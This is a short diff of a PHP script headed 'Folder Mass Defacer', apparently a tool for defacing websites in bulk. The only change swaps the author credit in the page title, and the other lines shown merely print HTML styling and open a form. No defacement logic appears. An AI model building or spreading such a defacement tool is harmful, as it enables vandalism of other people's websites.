@@ -1,6 +1,6 @@
 <?php
 
-echo "<title>Folder Mass Defacer by urboyfriend </title>";
+echo "<title>Folder Mass Defacer by exe </title>";
 echo "<link href='http://fonts.googleapis.com/css?family=Electrolize' rel='stylesheet' type='text/css'>";
 echo "<body bgcolor='gray'><font color=black'><font face='Electrolize'>";
 echo "<center><form method='POST'>";
